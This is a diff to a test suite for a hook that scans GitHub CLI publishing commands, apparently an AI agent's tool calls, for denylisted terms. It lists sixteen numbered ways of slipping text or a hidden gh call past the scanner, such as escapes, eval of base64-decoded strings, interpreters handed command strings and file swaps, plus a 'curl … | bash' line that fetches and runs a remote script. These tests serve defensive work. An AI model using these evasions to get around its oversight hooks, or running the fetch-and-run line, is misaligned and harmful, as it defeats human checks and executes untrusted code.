-gb("gb-d64", "DENY", "gh issue frobnicate 5 -wb=" + TA, "UNKNOWN verb, cluster with = - fails if only a pure-letter cluster is recognised", { msg: "does not know" });
-gb("gb-d65", "DENY", "gh pr merge 5 -sb " + TA, "pr merge: boolean -s then the text flag -b", { msg: "gh pr merge --body, line 1" });
-gb("gb-d66", "DENY", "gh issue create -t sloop -w$X", "a cluster whose tail is an expansion cannot be judged", { msg: "built from an expansion" });
-gp("gp-d15", "DENY", "gh pr create -dt '" + TA + "' -b 'sloop'", "the cluster walk on the PowerShell entry", { msg: "gh pr create --title, line 1" });
-gp("gp-d14", "DENY", "gh pr new --title 'x' --body '" + TA + "'", "the new alias on the PowerShell entry", { msg: "gh pr create --body, line 1" });
+// hard-blocked verbs: text the scan cannot read stays blocked even alone and in the strict form (the decision of 2026-11-15)
+gb("DENY", "gh gist create f.txt", "gist create publishes a file this scan does not read", { msg: "gh gist: a verb this scan does not know" });
+gb("DENY", "gh gist edit abc", "gist edit", { msg: "gh gist: a verb this scan does not know" });
+gb("DENY", "gh workflow run x.yml -f note=ok", "workflow run publishes inputs", { msg: "gh workflow: a verb this scan does not know" });
+gb("DENY", "gh variable set NAME --body ok", "variable set publishes a value", { msg: "gh variable: a verb this scan does not know" });
+gb("DENY", "gh discussion create -t x -b ok", "a discussion write", { msg: "gh discussion: a verb this scan does not know" });
+gb("DENY", "gh project item-create 1 --title ok", "a project item verb", { msg: "gh project: a verb this scan does not know" });
+gb("DENY", "gh extension exec foo", "extension exec runs anything", { msg: "gh extension: a verb this scan does not know" });
+gb("DENY", "gh alias set co 'pr checkout'", "defining a user alias", { msg: "gh alias: a verb this scan does not know" });
+gb("DENY", "gh my-extension run", "an extension or user alias", { msg: "a command this scan does not know" });
+gb("DENY", "gh frobnicate", "a top-level command no table knows", { msg: "a command this scan does not know" });
+gb("DENY", "gh constructor x", "a word that names a property of every JS object - fails if the tables are read with a plain `in` lookup", { msg: "a command this scan does not know" });
+gb("DENY", "gh repo autolink create AB https://example.invalid/<num>", "a sub-group verb that publishes a URL template", { msg: "gh repo autolink: a verb this scan does not know" });
+gb("DENY", "gh issue artifact create 5 --body-file x.md", "a nested verb that publishes text", { msg: "does not know" });
+gb("DENY", "gh agent-task create 'do it'", "agent-task create publishes a prompt", { msg: "gh agent-task: a verb this scan does not know" });
+gb("DENY", "gh issue frobnicate 5", "an unknown verb blocks even with NO text flag (allow only on positive recognition)", { msg: "does not know" });
+gb("DENY", "gh issue frobnicate 5 --body ok", "an unknown verb with a text flag", { msg: "does not know" });
+gb("DENY", "gh release frobnicate v1 -n ok", "unknown release verb, short text flag", { msg: "does not know" });
+gb("DENY", "gh issue create --newflag ok -t x --body-file clean.md", "a long flag the covered verb's table does not list (it could be a text flag of a newer gh)", { msg: "a long flag this scan does not know" });
+gb("DENY", "gh issue create -t sloop -wZ ok --body-file clean.md", "a cluster letter the table does not know blocks even with clean text", { msg: "letter this scan does not know" });
+gb("DENY", "gh --frobnicate issue create -t sloop --body-file clean.md", "an unknown leading flag: cobra pairs it with `issue`, so `create` would be the command, which no table places", { msg: "a command this scan does not know" });
+gb("DENY", "gh --frobnicate=1 issue create -t sloop --body-file clean.md", "an unknown leading flag in the --flag=value form", { msg: "flag before the verb that this scan does not know" });
+gb("DENY", "gh -x y issue view 5", "an unknown two-character leading flag with a read-only verb behind it blocks too", { msg: "flag before the verb that this scan does not know" });
 
-gb("gb-d67", "DENY", "gh issue frobnicate 5", "an unknown verb blocks even with NO text flag and no text at all (allow only on positive recognition) - fails if unrecognised verbs pass", { msg: "does not know" });
-gb("gb-a22", "ALLOW", "gh issue list -t '{{.title}}' --search " + TA, "a known read-only verb whose -t is a template, not text");
-gb("gb-a23", "ALLOW", "gh pr co 5", "the read-only alias pr co");
-gb("gb-a24", "ALLOW", "gh issue ls --search " + TA, "the read-only alias issue ls");
-gb("gb-a25", "ALLOW", "gh issue -R o/r view 5", "flags before the verb with no text flag anywhere");
-gb("gb-a26", "ALLOW", "gh issue new --title ok --body ok", "CONTROL - a clean alias call; fails if every alias is blocked");
-gb("gb-a27", "ALLOW", "gh pr revert 5 --title ok --body ok", "a clean pr revert");
+// ---- Tier A: what the delivery ritual runs, in the strict form, with clean text - all ALLOW -------------
+gb("ALLOW", (x) => "gh pr create --draft --base dev --title \"chore: tidy the scow dock\" --body-file " + GP(x, "clean.md"), "ritual: open a draft PR (an absolute body file)");
+gb("ALLOW", "gh pr create --fill --base dev --draft", "ritual: --fill takes the text from commits the push already published");
+gb("ALLOW", (x) => "gh pr edit 9 --body-file " + GP(x, "clean.md"), "ritual: rewrite a PR body");
+gb("ALLOW", "gh pr ready 9", "ritual: mark ready (a read-only-class verb, needs no denylist)", { dl: "missing" });
+gb("ALLOW", "gh pr merge 9 --squash --match-head-commit " + SHA, "ritual: merge pinned to a head commit");
+gb("ALLOW", "gh pr merge 9 --squash --auto", "ritual: merge with no text fields");
+gb("ALLOW", (x) => "gh issue comment 9 --body-file " + GP(x, "clean.md"), "ritual: a comment from a file");
+gb("ALLOW", "gh issue close 9 --comment \"merged in #9\"", "ritual: close with a short plain comment (a # inside quotes is text)");
+gb("ALLOW", "gh issue edit 9 --remove-label blocked", "ritual: label edit");
+gb("ALLOW", (x) => "gh issue create --title \"file the scow ledger\" --body-file " + GP(x, "clean.md") + " --label should", "ritual: file an issue");
+gb("ALLOW", (x) => "gh release create v9.9.9 --title 'v9.9.9 \"Scow\"' --notes-file " + GP(x, "clean.md") + " --verify-tag --latest",
+  "ritual: a release - the single-quoted title holds double quotes (literal in bash)");
+gb("ALLOW", "gh api graphql -f query='query { viewer { login } }'", "a graphql READ with a plain quoted field: braces inside single quotes are text");
+gb("ALLOW", "gh pr view 9 --json body --jq '.body'", "ritual: read a PR body", { dl: "missing" });
+gb("ALLOW", "gh issue comment 5 --body-file clean.md", "CONTROL - a clean RELATIVE body file; fails if every publish is denied");
+gb("ALLOW", "gh issue comment 5 -F clean.md --repo o/" + TA, "a term in a repo flag (not published text)");
+gb("ALLOW", (x) => "gh issue comment 5 --body-file " + GP(x, TA + "-clean.md"), "the hub's finding: a term only in a file PATH is not published - fails if the whole command line is scanned");
+gb("ALLOW", "gh issue edit 5 --add-label " + TA + " --repo o/" + TA, "a term in non-text flags (a label, a repo)");
+gb("ALLOW", "gh pr create -t ok -F clean.md -R o/" + TA + " -dl x", "a cluster in front of a repo flag with a term-bearing repo");
+gb("ALLOW", "gh issue create -t sloop -F clean.md -wl " + TA, "a cluster ending in the value-taking NON-text -l: its value is a label name, not published text - fails if every cluster value is scanned");
+gb("ALLOW", "gh issue create -t sloop -F clean.md -wl" + TA, "the same with the value attached");
+gb("ALLOW", "gh issue create -t sloop -F clean.md -we", "CONTROL - a boolean-only cluster with clean text");
+gb("ALLOW", "gh api repos/o/r/issues -iq " + TA + " -f title=ok", "gh api: -q is a jq filter, not a published field");
+gb("ALLOW", "gh api repos/o/r/issues -f " + TA + "=x", "a term in a field KEY - only values are published text");
+gb("ALLOW", "gh api repos/o/r/issues -f title=ok -F body=@clean.md --input clean.json", "clean api fields, @file and --input");
+gb("ALLOW", "gh issue create -t x -F clean.md -T " + TA, "issue create -T is a template NAME (a repo-committed file, scanned by pre-push), never read here");
+gb("ALLOW", "gh pr create -t x -F clean.md -T clean.md", "a clean pr template file");
+gb("ALLOW", "gh issue create -t x -F clean.md --recover recover-clean.json", "a clean recover file");
+gb("ALLOW", "gh issue create -t x -F clean.md --attach './" + TA + ".png'", "a term only in the attached file's PATH (no # alt text): paths are never scanned");
+gb("ALLOW", "gh issue create -t x -F clean.md --attach './a.png#clean alt'", "clean alt text");
+gb("ALLOW", "gh release create v1 --generate-notes", "--generate-notes: GitHub builds the notes from merged PRs");
+gb("ALLOW", "gh release create v1 --notes-from-tag -t ok", "--notes-from-tag: the tag message was pushed with the tag");
+gb("ALLOW", "gh pr create --fill-first --draft", "--fill-first");
+gb("ALLOW", "gh pr create -e", "-e: an interactive editor the hook cannot see");
+gb("ALLOW", (x) => "cd " + GP(x, "sub") + " && gh issue comment 5 --body-file " + GP(x, "clean.md"), "cd then an ABSOLUTE clean file path");
+gb("ALLOW", (x) => "cd " + GP(x, "sub") + "; gh issue comment 5 -F " + GP(x, "clean.md"), "the same with ;");
+gb("ALLOW", (x) => "cd " + GP(x, "sub") + " && gh pr view 9 --json state", "cd then a read");
+gb("ALLOW", "gh issue comment 5 --body-file clean.md", "a clean body file on the default-location denylists (home)", { dl: "home" });
+gb("ALLOW", "gh pr view 5 --json body", "read-only gh passes with no denylist - fails if reads need the file", { dl: "missing" });
+gb("ALLOW", "gh --version", "gh's own flags with no command", { dl: "missing" });
+gb("ALLOW", "gh issue list -t '{{.title}}' --search " + TA, "a known read-only verb whose -t is a template, not text", { dl: "missing" });
+gb("ALLOW", "gh pr co 5", "the read-only alias pr co", { dl: "missing" });
+gb("ALLOW", "gh issue ls --search " + TA, "the read-only alias issue ls", { dl: "missing" });
+gb("ALLOW", "gh issue -R o/r view 5", "flags before the verb with no text flag anywhere", { dl: "missing" });
+gb("ALLOW", "gh issue --repo o/r view 5", "the repo flag between the group and a read-only verb", { dl: "missing" });
+gb("ALLOW", "gh --repo o/" + TA + " pr view 5 --json body", "a read-only verb behind --repo with a term-bearing repo", { dl: "missing" });
+gb("ALLOW", "gh -R o/r issue create -t sloop -F clean.md", "CONTROL - a clean call with a leading -R; fails if every leading flag blocks");
+gb("ALLOW", "gh auth status", "a recognised no-text command (any verb)", { dl: "missing" });
+gb("ALLOW", "gh run list --limit 3", "workflow runs, read-only", { dl: "missing" });
+gb("ALLOW", "gh workflow list", "a recognised no-text verb of a partially covered command", { dl: "missing" });
+gb("ALLOW", "gh search issues sloop --repo o/r", "search", { dl: "missing" });
+gb("ALLOW", "gh status", "status", { dl: "missing" });
+gb("ALLOW", "gh issue artifact list 5", "a read-only sub-group verb", { dl: "missing" });
+gb("ALLOW", "gh extension list", "extension list", { dl: "missing" });
+gb("ALLOW", "gh api repos/o/r/pulls/5 --jq .title", "a read-only api call", { dl: "missing" });
+gb("ALLOW", "gh.exe pr view 5", "gh.exe is the command word", { dl: "missing" });
 
-gb("gb-a28", "ALLOW", "gh issue create -t sloop -b ok -wl " + TA,
-  "a cluster ending in the value-taking NON-text -l: its value (the next argument) is a label name, not published text - fails if every cluster value is scanned");
-gb("gb-a29", "ALLOW", "gh issue create -t sloop -b ok -wl" + TA, "the same with the value attached to the cluster");
-gb("gb-a30", "ALLOW", "gh issue create -t sloop -b ok -we", "CONTROL - a boolean-only cluster with clean text; fails if every cluster blocks");
-gb("gb-a31", "ALLOW", "gh pr create -dt ok -b ok -R o/" + TA, "a cluster in front of the text flags and -R with a term-bearing repo (not published text)");
-gb("gb-a32", "ALLOW", "gh api repos/o/r/issues -iq " + TA + " -f body=ok", "gh api: -q is a jq filter, not a published field");
-gb("gb-a01", "ALLOW", (x) => "gh issue comment 5 --body-file " + G(x, TA + "-clean.md"),
-  "the hub's finding: a term only in a file PATH is not published - fails if the whole command line is scanned");
-gb("gb-a02", "ALLOW", "gh issue edit 5 --body ok --repo o/" + TA + " --add-label " + TA,
-  "a term in non-text flags (a repo, a label) - fails if the command line is scanned");
-gb("gb-a03", "ALLOW", "gh issue list --search " + TA, "read-only gh with a term in it - fails if every gh call is scanned");
-gb("gb-a04", "ALLOW", "echo " + TA, "CONTROL - not gh at all; fails if the hook denies unconditionally");
-gb("gb-a05", "ALLOW", "ls -la", "a command that never mentions gh passes even with NO denylist (it is not parsed or scanned)", { dl: "missing" });
-gb("gb-a06", "ALLOW", "gh pr view 5 --json body", "read-only gh passes with no denylist - fails if reads need the file", { dl: "missing" });
-gb("gb-a07", "ALLOW", "gh issue create --title ok --body ok", "CONTROL - clean inline text; fails if every publish is denied");
-gb("gb-a08", "ALLOW", (x) => "gh issue comment 5 -F " + G(x, "clean.md"), "a clean body file");
-gb("gb-a09", "ALLOW", "gh pr create --title t --body-file - <<'EOF'" + NL + "all clean" + NL + "EOF", "a clean heredoc");
-gb("gb-a10", "ALLOW", "gh pr create --title t --body \"$(cat <<'EOF'" + NL + "all clean" + NL + "EOF" + NL + ")\"", "a clean cat-heredoc body");
-gb("gb-a11", "ALLOW", "gh api repos/o/r/issues -f title=ok -f body=ok", "clean api fields");
-gb("gb-a12", "ALLOW", (x) => "gh api repos/o/r/issues --input " + G(x, "clean.json") + " -F n=@" + G(x, "clean.md"), "clean api --input and -F @file");
-gb("gb-a13", "ALLOW", "gh api repos/o/r/issues -f " + TA + "=x", "a term in a field KEY - only values are published text");
-gb("gb-a14", "ALLOW", "gh issue comment \"$N\" --body ok", "a quoted expansion as a positional (a PR number) is tolerated");
-gb("gb-a15", "ALLOW", "git commit -m \"docs: gh issue create --body " + TA + "\"", "gh words inside one quoted argument of another command");
-gb("gb-a16", "ALLOW", (x) => "cat > " + G(x, "w2.md") + " <<'EOF'" + NL + "all clean" + NL + "EOF" + NL + "gh issue comment 5 --body-file " + G(x, "w2.md"),
-  "a clean file written in the SAME command (absent from disk) - fails if an unreadable file is blocked without resolving the write");
-gb("gb-a17", "ALLOW", "gh issue comment 5 --body ok # " + TA, "a term in a trailing shell comment");
-gb("gb-a18", "ALLOW", "gh pr merge 5 --squash --auto", "merge with no text fields");
-gb("gb-a19", "ALLOW", "cat > f <<'EOF'" + NL + TA + NL + "EOF", "a heredoc feeding a NON-gh command is data, not published text");
-gb("gb-a20", "ALLOW", "echo gh", "the word gh alone");
+// ===== TIER B: everything else that mentions gh - only searched for gh invocations =================
+// read-only gh anywhere in a compound command passes (no denylist needed)
+gb("ALLOW", "cd x; gh pr view 9 --json state --jq .state; gh run list | head", "compound read-only gh (the ritual's status line)", { dl: "missing" });
+gb("ALLOW", "for i in 1 2; do gh issue view $i; done", "a loop of reads", { dl: "missing" });
+gb("ALLOW", "gh pr view 9 --json body --jq '.body' | grep -c sloop", "a read piped to a filter", { dl: "missing" });
+gb("ALLOW", "gh pr view 9 --json state > out.txt", "a read redirected to a file", { dl: "missing" });
+gb("ALLOW", "gh pr view 9 2>&1", "a read with a stderr redirection", { dl: "missing" });
+gb("ALLOW", "env X=1 gh pr view 5", "a read behind env", { dl: "missing" });
+gb("ALLOW", "timeout 5 gh pr view 5", "a read behind timeout", { dl: "missing" });
+gb("ALLOW", "command gh pr view 5", "a read behind command", { dl: "missing" });
+gb("ALLOW", "gh pr checks 5 --watch && echo done", "a read then another command", { dl: "missing" });
+gb("ALLOW", "gh run list --limit 3 && gh run view 5 --log", "reads in sequence", { dl: "missing" });
+// a command that merely mentions gh runs no gh invocation
+gb("ALLOW", "git commit -m \"docs: gh issue create --body " + TA + "\"", "gh words inside one quoted argument of another command (a commit message)", { dl: "missing" });
+gb("ALLOW", "echo " + TA, "CONTROL - not gh at all; fails if the hook denies unconditionally");
+gb("ALLOW", "ls -la", "a command that never mentions gh passes even with NO denylist (it is not parsed or scanned)", { dl: "missing" });
+gb("ALLOW", "echo gh", "the word gh alone", { dl: "missing" });
+gb("ALLOW", "command -v gh >/dev/null && echo yes", "a lookup of gh itself (no command word follows it)", { dl: "missing" });
+gb("ALLOW", "which gh", "gh as the argument of which", { dl: "missing" });
+gb("ALLOW", "grep -rn gh docs/", "gh as a grep pattern followed by a path - the loose rule needs a gh command word after it", { dl: "missing" });
+gb("ALLOW", "git log --oneline -n 3 -- plugins/gh", "a path ending in gh", { dl: "missing" });
+gb("ALLOW", "node scripts/denylist-scan.js --help # gh", "a command that merely mentions gh in a comment", { dl: "missing" });
+gb("ALLOW", "cat > f <<'EOF'" + NL + TA + NL + "EOF", "a heredoc feeding a NON-gh command is data, not published text", { dl: "missing" });
+// a publishing gh outside the strict form blocks, whatever its text
+gb("DENY", "echo hi && gh issue comment 5 --body-file clean.md", "COMPOUND - a clean publishing gh behind another command", MB);
+gb("DENY", "gh issue comment 5 --body-file clean.md && echo done", "a publishing gh followed by another command", MB);
+gb("DENY", "gh issue comment 5 --body-file clean.md" + NL + "gh pr view 1", "two commands on two lines", MB);
+gb("DENY", "git push && gh pr create --fill", "push then a fill-only create: the create must be a call of its own", MB);
+gb("DENY", "gh pr merge 5 --squash 2>&1", "a redirection on a publishing gh", MB);
+gb("DENY", "gh issue comment 5 --body-file clean.md | cat", "a pipe after a publishing gh", MB);
+gb("DENY", "true; gh api repos/o/r/issues -f title=ok", "a gh api with a text flag behind another command", MB);
+gb("DENY", "GH_REPO=o/r gh issue comment 5 --body-file clean.md", "an environment assignment in front", MB);
+gb("DENY", "(gh issue comment 5 --body-file clean.md)", "in a subshell", MB);
+gb("DENY", "{ gh issue comment 5 --body-file clean.md; }", "in a brace group", MB);
+gb("DENY", "if true; then gh issue comment 5 --body-file clean.md; fi", "after then", MB);
+gb("DENY", "for i in 1 2; do gh issue comment $i --body-file clean.md; done", "after do", MB);
+gb("DENY", "u=$(gh issue create --title t --body-file clean.md)", "inside a command substitution", MB);
+gb("DENY", "find . -name x -exec gh issue comment 1 --body-file clean.md ;", "as a find -exec command", MB);
+gb("DENY", "\"gh\" \"ISSUE\" \"Create\" -t x -F clean.md", "the command and verb quoted, the verb in capitals", MB);
+gb("DENY", "/usr/bin/gh issue create -t x -F clean.md", "a full path to gh", MB);
+gb("DENY", "command gh issue create -t x -F clean.md", "behind `command`", MB);
+gb("DENY", "env X=1 gh issue create -t x -F clean.md", "behind env with an assignment", MB);
+gb("DENY", "time gh issue create -t x -F clean.md", "behind time", MB);
+gb("DENY", "sudo -u me gh issue create -t x -F clean.md", "behind sudo with a valued option", MB);
+gb("DENY", "timeout 5 gh issue create -t x -F clean.md", "behind timeout and its duration", MB);
+gb("DENY", "nice -n 5 gh issue create -t x -F clean.md", "behind nice with a valued option", MB);
+gb("DENY", "gh issue create -t x -F clean.md $(echo --label y)", "a command substitution among the flags", MB);
+gb("DENY", "gh issue comment 5 --body-file clean.md" + String.fromCharCode(12) + "&& true", "a form feed: not blanks, so not the strict form", MB);
+gb("DENY", "gh issue comment 1 -b " + TA + String.fromCharCode(0xa0) + "x", "a no-break space after a body word", MB);
+gb("DENY", "gh issue comment 1 -b " + TA + String.fromCharCode(0x2028) + "x", "U+2028 after a body word", MB);
+gb("DENY", String.fromCharCode(0xfeff) + "gh issue comment 1 -b " + TA, "a leading U+FEFF before the command", MB);
+gb("DENY", String.fromCharCode(0xa0) + "gh" + String.fromCharCode(0xa0) + "issue comment 1 -b " + TA, "no-break spaces around the command words", MB);
 
-gp("gp-d01", "DENY", "gh issue create --title 'x' --body '" + TA + "'",
-  "CONTROL - PowerShell entry, inline single-quoted body; fails if the PowerShell tool_name is not scanned", { msg: "--body, line 1" });
-gp("gp-d02", "DENY", "@'" + NL + "l1" + NL + TB + NL + "'@ | gh issue comment 5 --body-file -",
-  "a here-string piped to --body-file -", { msg: "--body-file (stdin), line 2" });
-gp("gp-d03", "DENY", "gh issue comment 5 --body @'" + NL + "l1" + NL + TA + NL + "'@",
-  "a here-string as the --body argument", { msg: "--body, line 2" });
-gp("gp-d04", "DENY", "gh api repos/o/r/issues -f body='" + TA + "'", "a PowerShell gh api -f value", { msg: "gh api -f #1" });
-gp("gp-d05", "DENY", (x) => "gh issue comment 5 --body (Get-Content -Raw " + G(x, "dirty.md") + ")",
-  "(Get-Content -Raw file) as the body", { msg: "--body, line 3" });
-gp("gp-d06", "DENY", "gh issue comment 5 --body-file $path", "UNRESOLVABLE: a PowerShell variable as the path", { msg: "through a file" });
-gp("gp-d07", "DENY", "& \"C:\\Program Files\\GitHub CLI\\gh.exe\" issue comment 5 --body \"" + TA + "\"",
-  "the call operator with a full path to gh.exe (a Windows path in the command)", { msg: "--body, line 1" });
-gp("gp-d08", "DENY", (x) => "Set-Content -Path " + G(x, "p.md") + " -Value '" + TA + "'; gh issue comment 5 --body-file " + G(x, "p.md"),
-  "a file written by Set-Content in the same command", { msg: "(file contents), line 1" });
-gp("gp-d09", "DENY", (x) => "gh issue comment 5 --body-file \"" + NATIVE(x, "dirty.md") + "\"",
-  "a native backslash path in double quotes - fails if backslashes are mangled by the bash -> node hand-off", { msg: "(file contents), line 3" });
-gp("gp-d10", "DENY", "$b = 'x'; gh issue comment 5 --body $b", "UNRESOLVABLE: a body variable", { msg: "through a file" });
-gp("gp-d11", "DENY", "gh issue comment 5 --body ok", "CONTROL (fail closed) on the PowerShell entry - denylist missing", { dl: "missing", msg: "denylist file missing" });
-gp("gp-d12", "DENY", "gh issue comment 5 --body ok", "CONTROL (blocks on its own errors) on the PowerShell entry - scanner absent", { scanner: "absent" });
-gp("gp-a01", "ALLOW", "gh issue create --title 'x' --body 'fine'", "CONTROL - clean PowerShell text");
-gp("gp-a02", "ALLOW", "@'" + NL + "l1" + NL + "'@ | gh issue comment 5 --body-file -", "a clean here-string");
-gp("gp-a03", "ALLOW", "Get-ChildItem | Select-String \"gh\"", "gh as a search word, no gh command");
-gp("gp-a04", "ALLOW", (x) => "gh issue comment 5 --body-file \"" + NATIVE(x, GS_TERMS[0] + "-clean.md") + "\"", "a term only in a native Windows PATH");
-gp("gp-a05", "ALLOW", "gh issue comment $n --body 'ok'", "a PowerShell variable as a positional PR number");
-gp("gp-a06", "ALLOW", (x) => "Set-Content -Path " + G(x, "p2.md") + " -Value 'clean'; gh issue comment 5 --body-file " + G(x, "p2.md"),
-  "a clean file written by Set-Content in the same command");
-gp("gp-a07", "ALLOW", "gh issue view 5", "read-only gh with no denylist", { dl: "missing" });
+// THE SIXTEEN BYPASSES of the second preflight, each with the fixture term in the published value
+gb("DENY", "gh issue comment 1 --body " + BSL + NL + "   \"" + TA + "\"", "BYPASS 1 - a line-continued --body", MB);
+gb("DENY", "printf '%s%s' bowsprit- ledger | gh issue comment 1 -F -", "BYPASS 2 - printf assembling the term, piped to -F -", MB);
+gb("DENY", "echo -e 'bowsprit-" + BSL + "x6cedger' | gh issue comment 1 -F -", "BYPASS 2 - echo -e with an escape", MB);
+gb("DENY", "gh issue comment 1 -b $'bowsprit-ledge" + BSL + "162'", "BYPASS 3 - an octal escape in an ANSI-C string", MB);
+gb("DENY", "gh issue comment 1 -b $'" + BSL + "U00000062owsprit-ledger'", "BYPASS 3 - a \\U escape", MB);
+gb("DENY", "gh issue comment 1 {-b,bowsprit-ledger}", "BYPASS 4 - brace expansion building the flag and its value", MB);
+gb("DENY", "echo bowsprit- >> a.md; echo ledger >> a.md; gh issue comment 1 -F a.md", "BYPASS 5 - appended lines (>>)", MB);
+gb("DENY", "echo bowsprit- | tee -a a.md; gh issue comment 1 -F a.md", "BYPASS 5 - tee -a", MB);
+gb("DENY", "echo " + TA + " > f.md; gh issue comment 1 -F f.md; echo clean > f.md", "BYPASS 6 - a write AFTER the gh call wins", MB);
+gb("DENY", "gh issue comment 1 --body-file <(echo " + TA + ")", "process substitution as the file", MB);
+gb("DENY", "cat <(gh issue comment 1 -b " + TA + ")", "a gh command inside a process substitution", MB);
+gb("DENY", "cat <<EOF | gh issue comment 1 -F -" + NL + "bowsprit-" + BSL + NL + "ledger" + NL + "EOF", "BYPASS 10 - an unquoted heredoc with a backslash-newline joining the term", MB);
+gb("DENY", "echo " + TA + " | xargs -I{} gh issue comment 1 -b {}", "BYPASS 11 - xargs -I{}", MB);
+gb("DENY", "env -S 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - env -S with a command string", { msg: "a wrapper option hides a command string" });
+gb("DENY", "sudo -s 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - sudo -s with a command string", { msg: "a command string that mentions gh" });
+gb("DENY", "tmux new 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - tmux", { msg: "a command string that mentions gh" });
+gb("DENY", "flock x -c 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - flock -c", { msg: "a command string that mentions gh" });
+gb("DENY", "python -c \"import os; os.system('gh issue comment 1 -b " + TA + "')\"", "BYPASS 14 - python -c", { msg: "a command string that mentions gh" });
+gb("DENY", "node -e \"require('child_process').execSync('gh issue comment 1 -b " + TA + "')\"", "BYPASS 14 - node -e", { msg: "a command string that mentions gh" });
+gb("DENY", "bash -c 'gh issue comment 1 -b " + TA + "'", "an interpreter handed a command string", { msg: "a command string that mentions gh" });
+gb("DENY", "sh -lc 'gh issue comment 1 -b " + TA + "'", "a login shell handed a command string", { msg: "a command string that mentions gh" });
+gb("DENY", "eval \"gh issue comment 1 -b " + TA + "\"", "eval", { msg: "a command string that mentions gh" });
+gb("DENY", "ssh host \"gh issue create -b " + TA + "\"", "a command string handed to ssh", { msg: "a command string that mentions gh" });
+gb("DENY", "bash <<'EOF'" + NL + "gh issue create -b " + TA + NL + "EOF", "an interpreter fed its commands by a heredoc", { msg: "reads its commands from a heredoc" });
+gb("DENY", "echo 'gh issue create -b " + TA + "' | bash", "an interpreter fed by a pipe from echo", { msg: "reads its commands from a heredoc" });
+gb("DENY", "curl example.invalid/x.sh | bash # gh", "an interpreter fed by a pipe the hook cannot read, in a command that mentions gh", { msg: "reads its commands from a heredoc" });
+gb("DENY", "cat <<EOF" + NL + "$(gh issue create -b " + TA + ")" + NL + "EOF", "a command substitution inside an UNQUOTED heredoc", { msg: "heredoc that expands commands" });
+gb("DENY", "cmd /c gh issue create -t x -F clean.md", "the gh command as separate words after cmd /c", MB);
+gb("DENY", "ssh host gh issue create -t x -F clean.md", "gh run on another host", MB);
+gb("DENY", "g$()h issue comment 1 -b " + TA, "BYPASS 15 - a glued gh word through an empty substitution", { msg: "built from an expansion" });
+gb("DENY", "g${x}h issue comment 1 -b " + TA, "BYPASS 15 - a glued gh word through a variable", { msg: "built from an expansion" });
+gb("DENY", "x=gh; $x issue comment 1 -b " + TA, "a variable as the command word", { msg: "built from an expansion" });
+gb("DENY", "$(echo gh) issue comment 1 -b " + TA, "a substitution as the command word", { msg: "built from an expansion" });
+gb("DENY", "g?  issue comment 1 -b " + TA, "BYPASS 15 - a glob that matches gh", { msg: "followed by a gh command and verb" });
+gb("DENY", "{g,x}h issue comment 1 -b " + TA, "BYPASS 15 - a brace expansion that spells gh", { msg: "followed by a gh command and verb" });
+gb("DENY", "g\"\"h issue comment 1 -b " + TA, "gh spelled with an empty quote pair - the mention gate must see the unquoted word", MB);
+gb("DENY", "g'h' issue comment 1 -b " + TA, "gh with one letter quoted", MB);
+gb("DENY", "eval \"$(echo Z2g= | base64 -d) issue comment 1 -b " + TA + "\"", "gh spelled by a decoded string inside eval", { msg: "command string built from an expansion" });
+gb("DENY", "cp clean.md f.md; gh issue comment 1 -F f.md", "BYPASS 16 - cp changing a file in the same command", MB);
+gb("DENY", "mv dirty.md f.md; gh issue comment 1 -F f.md", "BYPASS 16 - mv", MB);
+gb("DENY", "sed -i s/a/b/ f.md; gh issue comment 1 -F f.md", "BYPASS 16 - sed -i", MB);
+gb("DENY", "echo ${x:-'}'} ; gh issue comment 1 -b " + TA + " ; echo '", "a parameter expansion whose default holds quotes would desynchronise the lexer: refused as unparseable", { msg: "could not parse" });
+gb("DENY", "echo $((1+1)); gh issue comment 1 -b " + TA, "an arithmetic expansion: refused as unparseable", { msg: "could not parse" });
+gb("DENY", "gh issue comment 1 --body \"never closed", "a gh command that cannot be parsed blocks", { msg: "could not parse" });
+gb("DENY", "gh frobnicate && gh pr view 1", "an unknown gh command inside a compound command blocks", { msg: "a command this scan does not know" });
+gb("DENY", "gh gist create f.txt && echo ok", "a hard-blocked verb inside a compound command", { msg: "gh gist: a verb this scan does not know" });
+gb("DENY", "gh workflow run x.yml; gh run list", "workflow run inside a compound command", { msg: "gh workflow: a verb this scan does not know" });
+gb("DENY", "$GH issue create --title t -F clean.md", "UNRESOLVABLE: a command name built from a variable cannot be judged", { msg: "built from an expansion" });
+gb("DENY", "make-notes | gh issue comment 5 -F -", "a pipe from another command", MB);
+gb("DENY", "gh issue comment 5 --body \"$BODY\"", "a shell variable as a body", MB);
 
-// ---- Round 4: flags before the group, the allow-exit class, local files and alt text on covered verbs ----------------
-// cobra pairs a flag it does not know yet (`--x` without `=`, or exactly two characters) with the NEXT word, so gh runs
-// `gh -R o/r issue create -t t -b body`, and also `gh --body x issue comment 1`: flag words before the verb are judged
-// with the verb's own flags. ALLOW only on positive recognition: a command word after gh that no table places blocks.
-const BSL = String.fromCharCode(92);
-const GHEXE = '"C:' + BSL + 'Program Files' + BSL + 'GitHub CLI' + BSL + 'gh.exe"';
-gb("gb-d68", "DENY", "gh -R o/r issue create -t sloop -b \"" + TA + "\"", "a repo flag BEFORE the group: the old scan read -R's value as the group and allowed - fails if leading flags are skipped", { msg: "gh issue create --body, line 1" });
-gb("gb-d69", "DENY", "gh --repo o/r issue comment 1 -b \"" + TA + "\"", "the long form with a separate value", { msg: "gh issue comment --body, line 1" });
-gb("gb-d70", "DENY", "gh --repo=o/r pr create -t sloop -b \"" + TA + "\"", "the --repo=value form (already scanned before this round)", { msg: "gh pr create --body, line 1" });
-gb("gb-d71", "DENY", "gh --body \"" + TA + "\" issue comment 1", "a TEXT flag before the group: gh applies it to the verb - fails if only -R is understood in front", { msg: "gh issue comment --body, line 1" });
-gb("gb-d72", "DENY", "gh -b ok -t sloop issue create -R o/r --body-file " + "dirty.md", "leading text flags plus a body file after the verb", { msg: "--body-file (file contents), line 3" });
-gb("gb-d73", "DENY", "gh --frobnicate issue create -t sloop -b ok", "an UNKNOWN leading flag blocks even with clean text: cobra pairs it with `issue`, so `create` would be the command - which no table places", { msg: "a command this scan does not know" });
-gb("gb-d74", "DENY", "gh --frobnicate=1 issue create -t sloop -b ok", "an unknown leading flag in the --flag=value form (it swallows nothing): the leading-flag table rejects it", { msg: "flag before the verb that this scan does not know" });
